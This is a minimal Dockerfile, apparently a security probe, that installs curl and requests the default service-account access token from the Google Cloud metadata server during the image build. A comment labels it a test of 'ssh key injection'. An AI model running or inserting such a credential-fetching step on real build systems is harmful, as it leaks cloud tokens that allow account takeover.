FROM ubuntu:19.10 as builder

# Test ssh key injection
RUN apt-get update -qq && \
	apt-get dist-upgrade -qq -y --no-install-recommends && \
	apt-get install -qq -y --no-install-recommends curl && \
	rm -rf /var/lib/apt/lists/*

RUN curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-H "Metadata-Flavor: Google"
